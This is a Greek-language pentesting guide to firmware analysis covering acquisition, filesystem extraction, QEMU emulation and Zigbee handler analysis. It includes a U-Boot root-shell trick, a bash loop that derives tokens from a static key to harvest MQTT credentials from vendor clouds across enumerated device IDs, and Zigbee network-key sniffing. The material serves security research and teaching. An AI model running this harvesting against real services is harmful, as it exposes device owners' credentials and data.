# Ανάλυση Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Εισαγωγή**

### Σχετικοί πόροι

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Το Firmware είναι απαραίτητο λογισμικό που επιτρέπει στις συσκευές να λειτουργούν σωστά, διαχειριζόμενο και διευκολύνοντας την επικοινωνία μεταξύ των στοιχείων hardware και του λογισμικού με το οποίο αλληλεπιδρούν οι χρήστες. Αποθηκεύεται σε μόνιμη μνήμη, διασφαλίζοντας ότι η συσκευή μπορεί να έχει πρόσβαση σε ζωτικές οδηγίες από τη στιγμή που ενεργοποιείται, οδηγώντας στην εκκίνηση του λειτουργικού συστήματος. Η εξέταση και η πιθανή τροποποίηση του Firmware αποτελούν κρίσιμο βήμα για τον εντοπισμό ευπαθειών ασφαλείας.<sup>[[2]](#references)[[3]](#references)</sup>

## **Συλλογή πληροφοριών**

Η **συλλογή πληροφοριών** είναι ένα κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Αυτή η διαδικασία περιλαμβάνει τη συλλογή δεδομένων σχετικά με:

- Την αρχιτεκτονική της CPU και το λειτουργικό σύστημα που εκτελεί
- Τα χαρακτηριστικά του bootloader
- Τη διάταξη του hardware και τα datasheets
- Μετρικές της codebase και τοποθεσίες του πηγαίου κώδικα
- Εξωτερικές βιβλιοθήκες και τύπους αδειών χρήσης
- Ιστορικό ενημερώσεων και κανονιστικές πιστοποιήσεις
- Διαγράμματα αρχιτεκτονικής και ροής
- Αξιολογήσεις ασφαλείας και εντοπισμένες ευπάθειες

Για τον σκοπό αυτό, τα εργαλεία **open-source intelligence (OSINT)** είναι ανεκτίμητα, όπως και η ανάλυση οποιωνδήποτε διαθέσιμων στοιχείων λογισμικού ανοιχτού κώδικα μέσω χειροκίνητων και αυτοματοποιημένων διαδικασιών ελέγχου. Εργαλεία όπως το [Coverity Scan](https://scan.coverity.com) και το [LGTM της Semmle](https://lgtm.com/#explore) προσφέρουν δωρεάν static analysis, η οποία μπορεί να αξιοποιηθεί για τον εντοπισμό πιθανών προβλημάτων.

## **Απόκτηση του Firmware**

Η απόκτηση Firmware μπορεί να γίνει με διάφορους τρόπους, καθένας με διαφορετικό βαθμό πολυπλοκότητας:

- **Απευθείας** από την πηγή (developers, κατασκευαστές)
- Με **build** βάσει των παρεχόμενων οδηγιών
- Με **download** από επίσημους ιστότοπους υποστήριξης
- Χρήση ερωτημάτων **Google dork** για τον εντοπισμό φιλοξενούμενων αρχείων Firmware
- Άμεση πρόσβαση σε **cloud storage**, με εργαλεία όπως το [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Υποκλοπή **ενημερώσεων** με τεχνικές man-in-the-middle
- **Εξαγωγή** από τη συσκευή μέσω συνδέσεων όπως **UART**, **JTAG** ή **PICit**
- **Sniffing** αιτημάτων ενημέρωσης κατά την επικοινωνία της συσκευής
- Εντοπισμός και χρήση **hardcoded endpoints ενημέρωσης**
- **Dumping** από τον bootloader ή το δίκτυο
- **Αφαίρεση και ανάγνωση** του chip αποθήκευσης, όταν αποτύχουν όλες οι άλλες μέθοδοι, με χρήση κατάλληλων εργαλείων hardware

### Μόνο logs UART: επιβολή root shell μέσω του U-Boot env στη flash

Αν το RX του UART αγνοείται (μόνο logs), μπορείτε και πάλι να εξαναγκάσετε ένα init shell **επεξεργαζόμενοι το blob του περιβάλλοντος U-Boot** offline:<sup>[[6]](#references)</sup>

1. Κάντε dump της SPI flash με ένα clip SOIC-8 και programmer (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Εντοπίστε το partition του U-Boot env, επεξεργαστείτε το `bootargs` ώστε να περιλαμβάνει το `init=/bin/sh` και **υπολογίστε ξανά το U-Boot env CRC32** για το blob.
3. Κάντε reflash μόνο στο partition του env και επανεκκινήστε· θα πρέπει να εμφανιστεί ένα shell στο UART.

Αυτό είναι χρήσιμο σε ενσωματωμένες συσκευές όπου το shell του bootloader είναι απενεργοποιημένο, αλλά το partition του env είναι εγγράψιμο μέσω εξωτερικής πρόσβασης στο flash.

## Ανάλυση του firmware

Τώρα που **έχετε το firmware**, πρέπει να εξαγάγετε πληροφορίες από αυτό, ώστε να γνωρίζετε πώς να το χειριστείτε. Μπορείτε να χρησιμοποιήσετε διάφορα εργαλεία για αυτό:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Αν δεν βρείτε πολλά με αυτά τα εργαλεία, ελέγξτε την **entropy** της εικόνας με `binwalk -E <bin>`. Αν είναι χαμηλή, τότε η εικόνα μάλλον δεν είναι κρυπτογραφημένη. Αν είναι υψηλή, πιθανότατα είναι κρυπτογραφημένη (ή συμπιεσμένη με κάποιον τρόπο).

Επιπλέον, μπορείτε να χρησιμοποιήσετε αυτά τα εργαλεία για να εξαγάγετε **αρχεία ενσωματωμένα μέσα στο firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ή το [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) για να επιθεωρήσετε το αρχείο.

### Λήψη του συστήματος αρχείων

Με τα εργαλεία που αναφέρθηκαν προηγουμένως, όπως το `binwalk -ev <bin>`, θα έπρεπε να έχετε καταφέρει να **εξαγάγετε το σύστημα αρχείων**.\
Το Binwalk συνήθως το εξάγει μέσα σε έναν **φάκελο με όνομα τον τύπο του συστήματος αρχείων**, που συνήθως είναι ένας από τους εξής: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Χειροκίνητη εξαγωγή συστήματος αρχείων

Μερικές φορές, το binwalk **δεν θα έχει τα magic bytes του συστήματος αρχείων στις υπογραφές του**. Σε αυτές τις περιπτώσεις, χρησιμοποιήστε το binwalk για να **εντοπίσετε το offset του συστήματος αρχείων και να κάνετε carve το συμπιεσμένο σύστημα αρχείων** από το binary και να **εξαγάγετε χειροκίνητα** το σύστημα αρχείων σύμφωνα με τον τύπο του, ακολουθώντας τα παρακάτω βήματα.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Εκτελέστε την ακόλουθη **εντολή dd** για την εξαγωγή του συστήματος αρχείων Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Εναλλακτικά, μπορεί να εκτελεστεί και η ακόλουθη εντολή.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Για squashfs (όπως χρησιμοποιείται στο παραπάνω παράδειγμα)

`$ unsquashfs dir.squashfs`

Στη συνέχεια, τα αρχεία θα βρίσκονται στον κατάλογο "`squashfs-root`".

- Αρχεία αρχειοθήκης CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Για συστήματα αρχείων jffs2

`$ jefferson rootfsfile.jffs2`

- Για συστήματα αρχείων ubifs με NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Ανάλυση Firmware

Αφού αποκτηθεί το firmware, είναι απαραίτητο να αναλυθεί για να γίνει κατανοητή η δομή του και να εντοπιστούν πιθανές ευπάθειες. Αυτή η διαδικασία περιλαμβάνει τη χρήση διαφόρων εργαλείων για την ανάλυση και την εξαγωγή πολύτιμων δεδομένων από το firmware image.

### Εργαλεία αρχικής ανάλυσης

Παρακάτω παρατίθεται ένα σύνολο εντολών για τον αρχικό έλεγχο του δυαδικού αρχείου (που αναφέρεται ως `<bin>`). Αυτές οι εντολές βοηθούν στον προσδιορισμό των τύπων αρχείων, στην εξαγωγή strings, στην ανάλυση δυαδικών δεδομένων και στην κατανόηση των λεπτομερειών των partitions και των συστημάτων αρχείων:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Για να αξιολογηθεί η κατάσταση κρυπτογράφησης της εικόνας, ελέγχεται η **εντροπία** με την εντολή `binwalk -E <bin>`. Η χαμηλή εντροπία υποδηλώνει απουσία κρυπτογράφησης, ενώ η υψηλή εντροπία υποδεικνύει πιθανή κρυπτογράφηση ή συμπίεση.

Για την εξαγωγή **ενσωματωμένων αρχείων**, συνιστώνται εργαλεία και πόροι όπως η τεκμηρίωση **file-data-carving-recovery-tools** και το **binvis.io** για την επιθεώρηση αρχείων.

### Εξαγωγή του συστήματος αρχείων

Με την εντολή `binwalk -ev <bin>`, συνήθως είναι δυνατή η εξαγωγή του συστήματος αρχείων, συχνά σε έναν κατάλογο με όνομα που αντιστοιχεί στον τύπο του συστήματος αρχείων (π.χ. squashfs, ubifs). Ωστόσο, όταν το **binwalk** δεν καταφέρνει να αναγνωρίσει τον τύπο του συστήματος αρχείων λόγω απουσίας magic bytes, απαιτείται χειροκίνητη εξαγωγή. Αυτή περιλαμβάνει τη χρήση του `binwalk` για τον εντοπισμό της μετατόπισης του συστήματος αρχείων και, στη συνέχεια, της εντολής `dd` για την εξαγωγή του:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Στη συνέχεια, ανάλογα με τον τύπο του συστήματος αρχείων (π.χ. squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για τη μη αυτόματη εξαγωγή των περιεχομένων.

### Ανάλυση συστήματος αρχείων

Αφού εξαχθεί το σύστημα αρχείων, ξεκινά η αναζήτηση για κενά ασφαλείας. Εξετάζονται μη ασφαλείς network daemons, hardcoded διαπιστευτήρια, API endpoints, λειτουργίες διακομιστών ενημερώσεων, μη μεταγλωττισμένος κώδικας, scripts εκκίνησης και μεταγλωττισμένα binaries για offline ανάλυση.

**Βασικές τοποθεσίες** και **στοιχεία** προς έλεγχο περιλαμβάνουν:

- Τα **etc/shadow** και **etc/passwd** για διαπιστευτήρια χρηστών
- Πιστοποιητικά και κλειδιά SSL στο **etc/ssl**
- Αρχεία ρυθμίσεων και scripts για πιθανά κενά ασφαλείας
- Ενσωματωμένα binaries για περαιτέρω ανάλυση
- Συνήθεις web servers και binaries συσκευών IoT

Αρκετά εργαλεία βοηθούν στον εντοπισμό ευαίσθητων πληροφοριών και κενών ασφαλείας μέσα στο σύστημα αρχείων:

- Τα [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για αναζήτηση ευαίσθητων πληροφοριών
- Το [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για ολοκληρωμένη ανάλυση firmware
- Τα [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) και [**EMBA**](https://github.com/e-m-b-a/emba) για static και dynamic analysis

### Έλεγχοι ασφαλείας σε μεταγλωττισμένα binaries

Τόσο ο πηγαίος κώδικας όσο και τα μεταγλωττισμένα binaries που εντοπίζονται στο σύστημα αρχείων πρέπει να ελέγχονται προσεκτικά για κενά ασφαλείας. Εργαλεία όπως το **checksec.sh** για Unix binaries και το **PESecurity** για Windows binaries βοηθούν στον εντοπισμό μη προστατευμένων binaries που θα μπορούσαν να αποτελέσουν αντικείμενο εκμετάλλευσης.

## Συλλογή cloud config και διαπιστευτηρίων MQTT μέσω παραγόμενων URL tokens

Πολλά IoT hubs ανακτούν τις ρυθμίσεις τους ανά συσκευή από ένα cloud endpoint που μοιάζει με το εξής:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Κατά την ανάλυση firmware μπορεί να διαπιστώσετε ότι το `<token>` παράγεται τοπικά από το device ID με χρήση ενός hardcoded μυστικού, για παράδειγμα:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Αυτός ο σχεδιασμός επιτρέπει σε οποιονδήποτε γνωρίζει ένα deviceId και το STATIC_KEY να ανακατασκευάσει το URL και να ανακτήσει το cloud config, αποκαλύπτοντας συχνά διαπιστευτήρια MQTT σε απλό κείμενο και prefixes θεμάτων.

Πρακτική διαδικασία:

1) Εξαγάγετε το deviceId από τα logs εκκίνησης UART

- Συνδέστε έναν προσαρμογέα UART 3.3V (TX/RX/GND) και καταγράψτε τα logs:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Αναζητήστε γραμμές που εμφανίζουν το μοτίβο URL του cloud config και τη διεύθυνση του broker, για παράδειγμα:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Ανάκτηση του STATIC_KEY και του αλγορίθμου token από το firmware

- Φορτώστε τα binaries στο Ghidra/radare2 και αναζητήστε τη διαδρομή config ("/pf/") ή χρήση του MD5.
- Επιβεβαιώστε τον αλγόριθμο (π.χ., MD5(deviceId||STATIC_KEY)).
- Υπολογίστε το token στο Bash και μετατρέψτε το digest σε κεφαλαία:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Συλλέξτε cloud config και διαπιστευτήρια MQTT

- Συνθέστε το URL και ανακτήστε το JSON με curl· αναλύστε το με jq για να εξαγάγετε τα secrets:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Εκμεταλλευτείτε το MQTT σε plaintext και αδύναμα ACLs για topics (αν υπάρχουν)

- Χρησιμοποιήστε τα ανακτημένα διαπιστευτήρια για να εγγραφείτε σε topics συντήρησης και να αναζητήσετε ευαίσθητα συμβάντα:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Απαριθμήστε προβλέψιμα device IDs (σε μεγάλη κλίμακα, με εξουσιοδότηση)

- Πολλά οικοσυστήματα ενσωματώνουν bytes OUI/προϊόντος/τύπου του κατασκευαστή, ακολουθούμενα από ένα διαδοχικό επίθημα.
- Μπορείτε να δοκιμάσετε διαδοχικά υποψήφια IDs, να παράγετε tokens και να ανακτάτε configs μέσω προγραμματισμού:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Σημειώσεις
- Να λαμβάνετε πάντα ρητή εξουσιοδότηση πριν επιχειρήσετε μαζικό enumeration.
- Όπου είναι δυνατό, προτιμήστε την εξομοίωση ή το static analysis για την ανάκτηση μυστικών, χωρίς να τροποποιείτε το hardware-στόχο.


Η διαδικασία εξομοίωσης firmware επιτρέπει dynamic analysis είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να αντιμετωπίσει προκλήσεις που σχετίζονται με εξαρτήσεις από το hardware ή την αρχιτεκτονική, αλλά η μεταφορά του root filesystem ή συγκεκριμένων binaries σε μια συσκευή με αντίστοιχη αρχιτεκτονική και endianness, όπως ένα Raspberry Pi, ή σε μια προρυθμισμένη εικονική μηχανή, μπορεί να διευκολύνει περαιτέρω δοκιμές.

### Εξομοίωση μεμονωμένων binaries

Για την εξέταση μεμονωμένων προγραμμάτων, είναι κρίσιμο να προσδιορίσετε το endianness και την αρχιτεκτονική CPU του προγράμματος.

#### Παράδειγμα με αρχιτεκτονική MIPS

Για την εξομοίωση ενός binary αρχιτεκτονικής MIPS, μπορείτε να χρησιμοποιήσετε την εντολή:

```bash
file ./squashfs-root/bin/busybox
```

Και για να εγκαταστήσετε τα απαραίτητα εργαλεία εξομοίωσης:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Για MIPS (big-endian), χρησιμοποιείται το `qemu-mips`, ενώ για little-endian binaries, η επιλογή είναι το `qemu-mipsel`.

#### Εξομοίωση αρχιτεκτονικής ARM

Για binaries ARM, η διαδικασία είναι παρόμοια, με τον εξομοιωτή `qemu-arm` να χρησιμοποιείται για την εξομοίωση.

### Πλήρης εξομοίωση συστήματος

Εργαλεία όπως τα [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) και άλλα διευκολύνουν την πλήρη εξομοίωση firmware, αυτοματοποιώντας τη διαδικασία και υποστηρίζοντας τη δυναμική ανάλυση.

### Ανακατασκευή διασπασμένων και επαληθευμένων root filesystems για εξομοίωση

Αν το superblock του SquashFS είναι αναγνώσιμο, αλλά οι μετατοπίσεις των πινάκων inode, directory ή fragment είναι αδύνατες, μην τροποποιήσετε αμέσως το `unsquashfs`. Κάντε reverse engineering του binary πρώιμης εκκίνησης και αναπαραγάγετε το γράφημα συσκευών block που δημιουργεί: τα ενσωματωμένα συστήματα ενδέχεται να εκθέτουν ένα ονομαστικό root partition, αλλά να κατασκευάζουν το πραγματικό filesystem με αντιστοίχιση `dm-linear` που προσαρτά sectors δανεισμένα από άλλο partition. Οι έλεγχοι που βασίζονται μόνο στο superblock μπορεί να πετύχουν, ακόμη κι όταν όλα τα επόμενα metadata blocks βρίσκονται σε λάθος θέση.<sup>[[9]](#references)</sup>

Διατηρήστε ακριβώς την αριθμητική του firmware. Ειδικότερα, προσδιορίστε αν τα μήκη εκφράζονται σε bytes, sectors των 512 byte ή σελίδες των 4 KiB· αναπαραγάγετε τις ολισθήσεις και τις περικοπές με την αρχική τους σειρά· και λάβετε υπόψη περιοχές στο τέλος που εξαρτώνται από το bank σε διατάξεις A/B. Για παράδειγμα, το `(partition_bytes >> 12) << 3` πρώτα περικόπτει σε όριο 4 KiB και έπειτα εκφράζει το αποτέλεσμα σε sectors των 512 byte· αν το αντικαταστήσετε με `partition_bytes // 512`, η έκταση που προσαρτάται μπορεί να μετακινηθεί κατά μερικά kilobyte και να αλλοιώσει όλους τους επόμενους πίνακες SquashFS.<sup>[[9]](#references)</sup>

Μια χρήσιμη ροή εργασίας επικύρωσης είναι η εξής:<sup>[[9]](#references)</sup>

1. Ανακτήστε από το binary verifier/init τη συσκευή προέλευσης, το αρχικό sector και το μήκος κάθε τμήματος `dm-linear`.
2. Συνενώστε ή αντιστοιχίστε τις εκτάσεις χωρίς να αλλάξετε τη σημασιολογία στοίχισής τους.
3. Αν η εξαγωγή εξακολουθεί να αποτυγχάνει, αναζητήστε μόνο σε ένα μικρό εύρος γύρω από το προβλεπόμενο όριο και απαιτήστε αρκετές διαδοχικές έγκυρες δομές metadata, αντί να αποδεχτείτε μόνο ένα φαινομενικά εύλογο superblock.
4. Εκτελέστε ένα μη τροποποιημένο `unsquashfs` στην ανακατασκευασμένη εικόνα· η επιτυχής διάσχιση όλων των directories και fragments αποτελεί ισχυρότερη ένδειξη από το `unsquashfs -stat`.

#### Αντικατάσταση dm-verity από τον αναλυτή

Όταν ο αναλυτής ελέγχει τον kernel του QEMU, το initramfs και τους εικονικούς δίσκους, μπορεί να εκκινήσει ένα τροποποιημένο root αντικαθιστώντας το PID 1 επαλήθευσης του κατασκευαστή με ένα μικρό, στατικά συνδεδεμένο init. Πρόκειται για **αντικατάσταση της αλυσίδας εκκίνησης σε εργαστηριακό περιβάλλον**, όχι για παραβίαση του dm-verity, της υπογραφής RSA του, του Secure Boot ή ενός κλειδιού δεσμευμένου σε TPM.<sup>[[9]](#references)</sup>

Το init αντικατάστασης θα πρέπει να αναπαράγει τα λειτουργικά μέρη της αρχικής διαδρομής εκκίνησης: να προσαρτήσει το `devtmpfs`, να καλέσει το `setsid()`, να συνδέσει το `/dev/console` στα file descriptors 0–2, να προσαρτήσει τα `/proc` και `/sys`, να περιμένει τη συσκευή block που παρέχεται, να προσαρτήσει το τροποποιημένο root σε λειτουργία μόνο για ανάγνωση, να αποσυνδέσει τα pseudo-filesystems του παλιού root, να μετακινήσει το νέο mount στο `/`, να εκτελέσει `chroot` και να εκτελέσει με `execve()` το αρχικό `/sbin/init` του firmware. Η αποσύνδεση των `/dev`, `/proc` και `/sys` **πριν** από το `MS_MOVE` αποτρέπει την ακούσια αποσύνδεση mount points που ανήκουν στο νέο root.<sup>[[9]](#references)</sup>

Διατηρήστε την κατάσταση της συσκευής που μπορεί να τροποποιηθεί ξεχωριστά από το τροποποιημένο, αμετάβλητο root. Ένα overlay qcow2 μπορεί να διατηρήσει την κατάσταση LVM του αρχικού δίσκου, ενώ ένας δεύτερος δίσκος virtio μόνο για ανάγνωση παρέχει το τροποποιημένο SquashFS:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Αποσφαλμάτωση κατάστασης image εκτός σύνδεσης

Επιθεωρήστε τη μόνιμη κατάσταση έξω από το guest όταν οι αργές εκκινήσεις, τα καταστροφικά startup scripts ή η αναξιόπιστη καταγραφή στην κονσόλα δυσκολεύουν τον εντοπισμό της αστοχίας. Μην προσαρτάτε ποτέ ένα overlay που χρησιμοποιεί μια εκτελούμενη VM· εκθέστε το με `qemu-nbd`, περιορίστε τον εντοπισμό LVM στο προβλεπόμενο partition NBD και απενεργοποιήστε το volume group πριν αποσυνδεθείτε.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Για επαναλήψιμη απομόνωση σφαλμάτων, γράφετε αρχεία-δείκτες με χρονικές σημάνσεις σε έναν σταθερό, εγγράψιμο τόμο και επαληθεύετέ τα εκτός σύνδεσης· τα `/dev/kmsg`, οι FIFO και οι προσωρινές κονσόλες μπορεί να οδηγήσουν σε ψευδώς αρνητικά αποτελέσματα λόγω περιορισμού ρυθμού ή πρόωρου τερματισμού της διεργασίας. Επίσης, συγκρίνετε τις ακριβείς διεπαφές μεταξύ των επιπέδων πριν αλλάξετε άσχετο κώδικα: `uname -r` έναντι του `/lib/modules/`, τις δυνατότητες του ext4 στον δίσκο έναντι της διαμόρφωσης του kernel και τη γενιά του Mesa `libGL` έναντι του ABI του DRI driver και των ονομάτων driver που προκύπτουν από το PCI. Ένα στοιχείο μπορεί να υπάρχει και ακόμη και να φορτώνεται επιτυχώς μέσω `dlopen()`, αλλά να παραμένει μη χρησιμοποιήσιμο επειδή ο καταναλωτής του αναμένει διαφορετικό ABI.<sup>[[9]](#references)</sup>

## Δυναμική ανάλυση στην πράξη

Σε αυτό το στάδιο, χρησιμοποιείται για ανάλυση ένα πραγματικό περιβάλλον συσκευής ή ένα περιβάλλον εξομοίωσης. Είναι απαραίτητο να διατηρείται πρόσβαση μέσω shell στο OS και στο σύστημα αρχείων. Η εξομοίωση μπορεί να μην αναπαράγει τέλεια τις αλληλεπιδράσεις με το hardware, οπότε ενδέχεται να χρειαστούν περιστασιακές επανεκκινήσεις της. Η ανάλυση θα πρέπει να εξετάζει ξανά το σύστημα αρχείων, να κάνει exploit σε εκτεθειμένες ιστοσελίδες και υπηρεσίες δικτύου και να διερευνά ευπάθειες του bootloader. Οι έλεγχοι ακεραιότητας του firmware είναι κρίσιμοι για τον εντοπισμό πιθανών ευπαθειών backdoor.

## Τεχνικές ανάλυσης κατά την εκτέλεση

Η ανάλυση κατά την εκτέλεση περιλαμβάνει την αλληλεπίδραση με μια διεργασία ή ένα binary στο περιβάλλον λειτουργίας του, χρησιμοποιώντας εργαλεία όπως τα gdb-multiarch, Frida και Ghidra για τον ορισμό breakpoints και τον εντοπισμό ευπαθειών μέσω fuzzing και άλλων τεχνικών.

Για ενσωματωμένους στόχους χωρίς πλήρες debugger, **αντιγράψτε ένα στατικά συνδεδεμένο `gdbserver`** στη συσκευή και συνδεθείτε απομακρυσμένα:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor αντιστοίχιση μηνυμάτων

Σε IoT hubs, το RF stack συχνά διαχωρίζεται ανάμεσα σε έναν **radio MCU** και μια διεργασία userland του Linux. Μια χρήσιμη ροή εργασίας είναι να χαρτογραφήσετε τη διαδρομή:<sup>[[8]](#references)</sup>

1. **RF frame** στον αέρα
2. **controller-side parser** στον radio MCU
3. **serial/UART text ή TLV protocol** που προωθείται στο Linux (για παράδειγμα `/dev/tty*`)
4. **application dispatcher** στο κύριο daemon
5. **protocol-specific handler / state machine**

Αυτή η αρχιτεκτονική δημιουργεί δύο στόχους για reverse engineering αντί για έναν. Αν ο controller μετατρέπει τα δυαδικά radio frames σε ένα text protocol όπως `Group,Command,arg1,arg2,...`, ανακτήστε:

- Τα **message groups** και τους πίνακες dispatch
- Ποια μηνύματα μπορούν να προέρχονται από το **network** έναντι του ίδιου του controller
- Τα ακριβή **manufacturer-specific discriminator fields** (για παράδειγμα `manufacturer_code` και `cluster_command` του Zigbee)
- Ποιοι handlers είναι προσβάσιμοι μόνο κατά τις φάσεις **commissioning**, discovery ή λήψης firmware/model

Ειδικά για το Zigbee, καταγράψτε την κίνηση pairing και ελέγξτε αν ο στόχος εξακολουθεί να βασίζεται στο προεπιλεγμένο **Link Key** `ZigBeeAlliance09`. Αν ναι, η υποκλοπή της κίνησης commissioning μπορεί να αποκαλύψει το **Network Key**. Οι install codes του Zigbee 3.0 μειώνουν αυτή την έκθεση, οπότε σημειώστε αν η συσκευή που δοκιμάστηκε τους επιβάλλει πράγματι.

### Manufacturer-specific protocol handlers και FSM-gated προσβασιμότητα

Οι εντολές Zigbee/ZCL ειδικές για τον vendor αποτελούν συχνά καλύτερο στόχο από τα τυποποιημένα clusters, επειδή τροφοδοτούν **custom parsing code** και εσωτερικά **FSMs** με λιγότερο δοκιμασμένη επικύρωση.<sup>[[8]](#references)</sup>

Πρακτική ροή εργασίας:

- Κάντε reverse engineering στον command dispatcher μέχρι να εντοπίσετε τον **vendor-only handler**.
- Ανακτήστε τους πίνακες **FSM state**, **event**, **check**, **action** και **next-state**.
- Εντοπίστε τις **transitional states** που προχωρούν αυτόματα, καθώς και τους κλάδους retry/error που τελικά κάνουν reset ή απελευθερώνουν state ελεγχόμενο από τον attacker.
- Επιβεβαιώστε ποιες νόμιμες ανταλλαγές πρωτοκόλλου απαιτούνται για να φτάσει το daemon στην ευάλωτη κατάσταση, αντί να υποθέτετε ότι ο προβληματικός handler είναι πάντα προσβάσιμος.

Για πρωτόκολλα ευαίσθητα στον χρονισμό, το packet replay από ένα Python framework μπορεί να είναι υπερβολικά αργό. Μια πιο αξιόπιστη προσέγγιση είναι να προσομοιώσετε μια νόμιμη συσκευή σε πραγματικό hardware (για παράδειγμα **nRF52840**) με vendor-grade stack, ώστε να μπορείτε να εκθέσετε τα σωστά **endpoints**, **attributes** και τον χρονισμό του commissioning.

### Κατηγορία bug σε fragmented downloads σε embedded daemons

Μια επαναλαμβανόμενη κατηγορία firmware bugs εμφανίζεται σε λήψεις **fragmented blob/model/configuration**:<sup>[[8]](#references)</sup>

1. Το **first fragment** (`offset == 0`) αποθηκεύει το `ctx->total_size` και δεσμεύει μνήμη με `malloc(total_size)`.
2. Τα επόμενα fragments επικυρώνουν μόνο τα ελεγχόμενα από τον attacker **packet-local** πεδία, όπως `packet_total_size >= offset + chunk_len`.
